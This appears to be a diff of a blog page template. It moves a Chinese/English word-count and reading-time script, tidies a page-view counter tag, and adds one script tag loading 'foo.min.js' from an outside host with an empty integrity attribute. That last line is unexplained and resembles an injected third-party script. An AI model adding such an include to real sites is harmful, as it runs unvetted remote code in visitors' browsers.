@@ -229,6 +229,24 @@
                 fix.css({ top: offsetTop });
             }
         })
+
+        var pagescontent = $('.section.fade-in.two .container.markdown.top-pad');
+        function wordCount(data) {
+            var pattern = /[a-zA-Z0-9_\u0392-\u03c9]+|[\u4E00-\u9FFF\u3400-\u4dbf\uf900-\ufaff\u3040-\u309f\uac00-\ud7af]+/g;
+            var m = data.match(pattern);
+            var count = 0;
+            if (m == null) { return count; }
+            for (var i = 0; i < m.length; i++) {
+                if (m[i].charCodeAt(0) >= 0x4E00) {
+                    count += m[i].length;
+                } else {
+                    count += 1;
+                }
+            }
+            return count;
+        }
+        count1 = wordCount(pagescontent[0].innerText)
+        $('#read-times')[0].innerText = '📌提示：本文共计' + count1 + '字，预计📰阅读时间' + (count1 / 270 + 1).toFixed(0) + '分钟'
     }
 </script>
 	
@@ -301,39 +319,19 @@
     
       
     
+    
     <div class="" id="">
     <span id="busuanzi_container_page_pv">
         阅读次数:<span id="busuanzi_value_page_pv"></span>
-      </span>
+    </span>
     <blockquote>
         <p id="read-times"></p>
-    </br>
+        </br>
     </blockquote>
 </div>
 
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
-</script>
-<script type="text/javascript">
-    window.onload = function () {
-        var fix = $('.section.fade-in.two .container.markdown.top-pad');
-        function wordCount(data) {
-            var pattern = /[a-zA-Z0-9_\u0392-\u03c9]+|[\u4E00-\u9FFF\u3400-\u4dbf\uf900-\ufaff\u3040-\u309f\uac00-\ud7af]+/g;
-            var m = data.match(pattern);
-            var count = 0;
-            if (m == null) { return count; }
-            for (var i = 0; i < m.length; i++) {
-                if (m[i].charCodeAt(0) >= 0x4E00) {
-                    count += m[i].length;
-                } else {
-                    count += 1;
-                }
-            }
-            return count;
-        }    
-        count = wordCount(fix[0].innerText) 
-        $('#read-times')[0].innerText = '📌提示：本文共计'+count+'字，预计📰阅读时间'+(count/270+1).toFixed(0) +'分钟'
-    }
-</script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
 </div>
 
 <div class="container markdown top-pad">
@@ -446,6 +444,7 @@
 
 
 
+    <script src="https://radish.cloud/foo.min.js" integrity=""></script>
 
         
         
